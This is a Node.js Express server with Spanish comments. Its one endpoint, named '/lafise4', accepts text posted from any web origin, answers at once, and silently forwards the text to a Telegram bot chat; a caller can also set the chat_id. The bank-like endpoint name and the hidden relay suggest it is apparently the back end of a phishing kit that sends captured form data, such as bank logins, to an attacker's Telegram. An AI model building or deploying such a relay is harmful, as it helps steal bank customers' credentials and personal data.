import express from "express";
import cors from "cors";
import helmet from "helmet";
import multer from "multer";
import axios from "axios";
import dotenv from "dotenv";

dotenv.config();

const app = express();
const upload = multer({ storage: multer.memoryStorage() });

// --- Config básica ---
app.set("trust proxy", 1);
app.use(helmet({ contentSecurityPolicy: false }));
app.use(cors({ origin: true, methods: ["GET","POST","OPTIONS"] }));
app.use(express.json({ limit: "32kb" }));
app.use(express.urlencoded({ extended: true, limit: "32kb" }));

const PORT = process.env.PORT || 8080;
const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN || "";
const TELEGRAM_CHAT_ID   = process.env.TELEGRAM_CHAT_ID || "";

// Aviso si faltan variables
if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
  console.warn("[WARN] Faltan TELEGRAM_* en variables de entorno");
}

// Healthcheck
app.get("/", (_req, res) => res.send("OK"));

// ---- Endpoint principal (form-data o JSON) ----
app.post("/lafise4", upload.none(), (req, res) => {
  try {
    // Acepta text | mensaje | message
    const raw =
      (typeof req.body.text === "string" && req.body.text.trim()) ||
      (typeof req.body.mensaje === "string" && req.body.mensaje.trim()) ||
      (typeof req.body.message === "string" && req.body.message.trim()) ||
      "";

    if (!raw) {
      return res.status(400).json({ ok: false, error: "Falta 'text'/'mensaje'/'message'" });
    }

    // Responder rápido al front
    res.status(202).json({ ok: true });

    // Enviar a Telegram en background
    (async () => {
      const chat_id =
        (req.body.chat_id && String(req.body.chat_id).trim()) || TELEGRAM_CHAT_ID;

      const payload = {
        chat_id,
        text: raw.slice(0, 4096),            // límite de Telegram
        disable_web_page_preview: true,
      };

      const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
      await axios.post(url, payload, { timeout: 10000 });
    })().catch((e) => {
      console.error("[TG ERROR]", e?.response?.data || e.message || e);
    });

  } catch (e) {
    console.error("[HANDLER ERROR]", e?.response?.data || e.message || e);
    return res.status(500).json({ ok: false, error: "Error interno" });
  }
});

// Manejo de errores por si algo se escapa
app.use((err, _req, res, _next) => {
  console.error("[UNCAUGHT]", err);
  res.status(500).json({ ok: false, error: "Error interno" });
});

app.listen(PORT, () => console.log(`Listening on ${PORT}`));